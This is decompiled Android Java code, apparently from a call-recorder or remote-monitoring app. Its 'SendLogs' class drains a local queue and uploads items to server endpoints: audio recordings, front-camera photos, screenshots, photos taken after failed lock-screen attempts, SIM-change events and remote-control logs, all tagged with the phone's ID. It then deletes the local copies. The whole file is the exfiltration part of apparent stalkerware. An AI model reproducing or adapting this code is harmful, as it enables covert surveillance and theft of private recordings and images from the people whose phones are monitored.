package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.C;
import a.c.b.W;
import a.c.e.a;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.util.Base64;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: SendLogs */
public class j implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f278b;

    /* renamed from: a reason: collision with root package name */
    private final Context f279a;

    public j(Context context) {
        this.f279a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f279a.stopService(new Intent(this.f279a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(12:(4:10|11|12|13)|16|17|18|19|24|26|27|28|(3:30|31|(2:33|(1:37))(1:38))(2:39|(2:41|(1:43))(5:44|45|(3:47|48|(2:50|(2:52|(1:54))(2:55|(1:59))))|60|(2:74|(2:90|(1:92))(2:80|(2:82|(1:84))(2:85|(1:89))))(2:64|(2:66|(1:68))(2:69|(1:73)))))|93|(1:106)(1:96)) */
    /* JADX WARNING: Code restructure failed: missing block: B:20:0x006a, code lost:
        r0 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:21:0x006b, code lost:
        r7 = r0;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:23:?, code lost:
        r7.getStackTrace();
        com.crashlytics.android.Crashlytics.logException(r7);
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:16:0x005e */
    /* JADX WARNING: Missing exception handler attribute for start block: B:18:0x0066 */
    public void run() {
        C c2;
        int i = 0;
        try {
            if (f278b) {
                a();
                return;
            }
            int i2 = 1;
            f278b = true;
            W w = new W(this.f279a);
            w.b();
            C c3 = new C();
            Cursor c4 = w.c();
            if (c4 != null && c4.moveToFirst()) {
                while (true) {
                    try {
                        c2 = new C();
                        c2.a(c4.getInt(i));
                        c2.c(c4.getInt(i2));
                        c2.b(c4.getString(2));
                        c2.c(c4.getString(3));
                        c2.b(c4.getInt(4));
                        c2.a(c4.getString(5));
                    } catch (Exception unused) {
                        c2 = c3;
                    }
                    w.a(c2.c());
                    w.d();
                    c3 = c2;
                    String str = "type";
                    String str2 = "dateConnexion";
                    String str3 = "data";
                    String str4 = "idPhone";
                    String str5 = "";
                    if (c3.d() == -1) {
                        File file = new File(c3.a());
                        if (file.exists()) {
                            String encodeToString = Base64.encodeToString(c.a(file), i);
                            HashMap hashMap = new HashMap();
                            StringBuilder sb = new StringBuilder();
                            sb.append(str5);
                            sb.append(e.e(this.f279a));
                            hashMap.put(str4, sb.toString());
                            hashMap.put(str2, c3.b());
                            hashMap.put(str3, encodeToString);
                            hashMap.put(str, "TakePictureLockWrong");
                            if (a.b("pictures/setPicturePasswordFailed.php", (Map<String, String>) hashMap) && w.a(c3.c())) {
                                file.delete();
                            }
                        } else {
                            w.a(c3.c());
                        }
                    } else if (c3.d() == -3) {
                        HashMap hashMap2 = new HashMap();
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append(str5);
                        sb2.append(c3.e());
                        hashMap2.put(str4, sb2.toString());
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(str5);
                        sb3.append(c3.a());
                        hashMap2.put(str3, sb3.toString());
                        if (a.b("sim/setChangeSIM.php", (Map<String, String>) hashMap2)) {
                            w.a(c3.c());
                        }
                    } else {
                        String str6 = "remoteControl/setLog.php";
                        String str7 = "idLog";
                        if (c3.f() != null) {
                            if (c3.f().equals("RecordAudio")) {
                                File file2 = new File(c3.a());
                                if (!file2.exists()) {
                                    w.a(c3.c());
                                    HashMap hashMap3 = new HashMap();
                                    StringBuilder sb4 = new StringBuilder();
                                    sb4.append(str5);
                                    sb4.append(e.e(this.f279a));
                                    hashMap3.put(str4, sb4.toString());
                                    hashMap3.put(str2, c3.b());
                                    hashMap3.put(str, c3.f());
                                    StringBuilder sb5 = new StringBuilder();
                                    sb5.append(str5);
                                    sb5.append(c3.d());
                                    hashMap3.put(str7, sb5.toString());
                                    hashMap3.put(str3, "RECORDAUDIOERROR");
                                    if (a.b(str6, (Map<String, String>) hashMap3)) {
                                        w.a(c3.c());
                                    }
                                } else {
                                    HashMap hashMap4 = new HashMap();
                                    StringBuilder sb6 = new StringBuilder();
                                    sb6.append(str5);
                                    sb6.append(e.e(this.f279a));
                                    hashMap4.put(str4, com.app.retrofit.a.a(sb6.toString()));
                                    hashMap4.put(str2, com.app.retrofit.a.a(c3.b()));
                                    hashMap4.put(str, com.app.retrofit.a.a(c3.f()));
                                    StringBuilder sb7 = new StringBuilder();
                                    sb7.append(str5);
                                    sb7.append(c3.d());
                                    hashMap4.put(str7, com.app.retrofit.a.a(sb7.toString()));
                                    if (a.a("recordAudio/setRecordAudio.php", hashMap4, Part.createFormData("uploadedfile", file2.getName(), RequestBody.create(MediaType.parse(ShareTarget.ENCODING_TYPE_MULTIPART), file2))) && w.a(c3.c())) {
                                        file2.delete();
                                    }
                                }
                            }
                        }
                        if (c3.f() != null && c3.f().equals("TakePictureFront")) {
                            File file3 = new File(c3.a());
                            if (!file3.exists()) {
                                w.a(c3.c());
                                HashMap hashMap5 = new HashMap();
                                StringBuilder sb8 = new StringBuilder();
                                sb8.append(str5);
                                sb8.append(e.e(this.f279a));
                                hashMap5.put(str4, sb8.toString());
                                hashMap5.put(str2, c3.b());
                                hashMap5.put(str, c3.f());
                                StringBuilder sb9 = new StringBuilder();
                                sb9.append(str5);
                                sb9.append(c3.d());
                                hashMap5.put(str7, sb9.toString());
                                hashMap5.put(str3, "TAKEPICTUREKO");
                                if (a.b(str6, (Map<String, String>) hashMap5)) {
                                    w.a(c3.c());
                                }
                            } else {
                                String encodeToString2 = Base64.encodeToString(c.a(file3), i);
                                HashMap hashMap6 = new HashMap();
                                StringBuilder sb10 = new StringBuilder();
                                sb10.append(str5);
                                sb10.append(e.e(this.f279a));
                                hashMap6.put(str4, sb10.toString());
                                hashMap6.put(str2, c3.b());
                                hashMap6.put(str, c3.f());
                                StringBuilder sb11 = new StringBuilder();
                                sb11.append(str5);
                                sb11.append(c3.d());
                                hashMap6.put(str7, sb11.toString());
                                hashMap6.put(str3, encodeToString2);
                                if (a.b(str6, (Map<String, String>) hashMap6) && w.a(c3.c())) {
                                    file3.delete();
                                }
                            }
                        } else if (c3.f() == null || (!c3.f().equals("screenShot") && !c3.f().equals("takeScreenShot"))) {
                            HashMap hashMap7 = new HashMap();
                            StringBuilder sb12 = new StringBuilder();
                            sb12.append(str5);
                            sb12.append(c3.e());
                            hashMap7.put(str4, sb12.toString());
                            hashMap7.put(str2, c3.b());
                            hashMap7.put(str, c3.f());
                            StringBuilder sb13 = new StringBuilder();
                            sb13.append(str5);
                            sb13.append(c3.d());
                            hashMap7.put(str7, sb13.toString());
                            hashMap7.put(str3, c3.a());
                            if (a.b(str6, (Map<String, String>) hashMap7)) {
                                w.a(c3.c());
                            }
                        } else {
                            File file4 = new File(c3.a());
                            if (!file4.exists()) {
                                HashMap hashMap8 = new HashMap();
                                StringBuilder sb14 = new StringBuilder();
                                sb14.append(str5);
                                sb14.append(e.e(this.f279a));
                                hashMap8.put(str4, sb14.toString());
                                hashMap8.put(str2, c3.b());
                                hashMap8.put(str, c3.f());
                                StringBuilder sb15 = new StringBuilder();
                                sb15.append(str5);
                                sb15.append(c3.d());
                                hashMap8.put(str7, sb15.toString());
                                hashMap8.put(str3, "TAKESCREENKO");
                                if (a.b(str6, (Map<String, String>) hashMap8)) {
                                    w.a(c3.c());
                                }
                            } else {
                                String encodeToString3 = Base64.encodeToString(c.a(file4), 0);
                                HashMap hashMap9 = new HashMap();
                                StringBuilder sb16 = new StringBuilder();
                                sb16.append(str5);
                                sb16.append(e.e(this.f279a));
                                hashMap9.put(str4, sb16.toString());
                                hashMap9.put(str2, c3.b());
                                hashMap9.put(str, c3.f());
                                StringBuilder sb17 = new StringBuilder();
                                sb17.append(str5);
                                sb17.append(c3.d());
                                hashMap9.put(str7, sb17.toString());
                                hashMap9.put(str3, encodeToString3);
                                if (a.b(str6, (Map<String, String>) hashMap9) && w.a(c3.c())) {
                                    file4.delete();
                                }
                            }
                        }
                    }
                    if (!c4.moveToNext()) {
                        break;
                    }
                    i = 0;
                    i2 = 1;
                }
            }
            w.a();
            if (c4 != null) {
                c4.close();
            }
            f278b = false;
            a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused2) {
            }
        }
    }
}
